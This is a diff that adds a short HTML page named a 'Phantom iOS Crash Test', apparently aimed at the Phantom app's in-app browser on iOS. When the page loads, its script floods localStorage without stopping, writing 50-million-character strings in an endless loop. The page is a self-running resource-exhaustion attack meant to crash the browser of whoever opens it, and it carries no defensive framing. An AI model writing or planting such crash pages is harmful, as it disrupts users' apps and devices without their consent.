@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Phantom iOS Crash Test (localStorage)</title>
+<style>
+body { font-family: sans-serif; padding: 20px; background: #eee; }
+pre { background: #111; color: #0f0; padding: 10px; height: 200px; overflow: auto; }
+</style>
+</head>
+<body>
+
+<h2>Phantom iOS Crash Test</h2>
+<b>localStorage Flood</b>
+
+<pre id="log"></pre>
+
+<script>
+const log = m => document.getElementById("log").textContent += "\n" + m;
+
+function floodStorage() {
+  try {
+    let big = "X".repeat(50_000_000); // 50 juta karakter
+    let i = 0;
+    while (true) {
+      localStorage.setItem("key_" + i, big);
+      i++;
+      log("Stored key_" + i);
+    }
+  } catch(e) {
+    log("Error: " + e.message);
+  }
+}
+
+// AUTO START
+floodStorage();
+</script>
+
+</body>
+</html>
